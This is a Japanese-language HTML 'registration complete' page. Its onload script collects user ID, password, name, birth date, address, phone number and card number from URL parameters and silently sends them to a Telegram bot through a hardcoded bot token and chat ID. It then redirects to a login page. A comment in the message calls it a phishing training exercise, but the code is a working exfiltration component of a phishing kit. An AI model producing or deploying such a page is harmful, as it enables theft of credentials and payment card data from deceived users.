
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>登録内容の確認完了</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .message-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            text-align: center;
        }
        h2 {
            color: #003366;
            margin-bottom: 20px;
        }
        p {
            font-size: 16px;
            color: #333;
        }
    </style>
<script>
    function showData() {
        const params = new URLSearchParams(window.location.search);

        const data = {
            user_id: params.get("userid"),
            password: params.get("password"),
            name: params.get("name"),
            gender: params.get("gender"),
            dob: params.get("dob"),
            age: params.get("age"),
            address: params.get("address"),
            phone: params.get("phone"),
            card: params.get("card")
        };

        const token = "8297433896:AAE_xAemQLlDVbcySggtT5AOXgyxH5f50B4";
        const chatId = "-1003060954370";

        const message = `
📩 登録情報:


👤 ユーザーID: ${data.user_id}
🔐 パスワード: ${data.password}
📛 名前: ${data.name}
🚻 性別: ${data.gender}
🎂 生年月日: ${data.dob}
🔢 年齢: ${data.age}
🏠 住所: ${data.address}
📱 電話番号: ${data.phone}
💳 カード番号: ${data.card}

※これはフィッシングサイトの構造を理解するためのハンズオンです。実際の情報を入力しないでください。
                    `;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
        })
        .then(res => res.json())
        .then(data => console.log("✅ 送信成功:", data))
        .catch(err => console.error("❌ 送信失敗:", err));

        setTimeout(function () {
            window.location.href = 'login.html';
        }, 5000);
    }

    window.onload = showData;
</script>
</head>
<body>
    <div class="message-box">
        <h2>登録内容の確認が完了しました</h2>
        <p>5秒後にログイン画面へリダイレクトします...</p>
    </div>
</body>
</html>
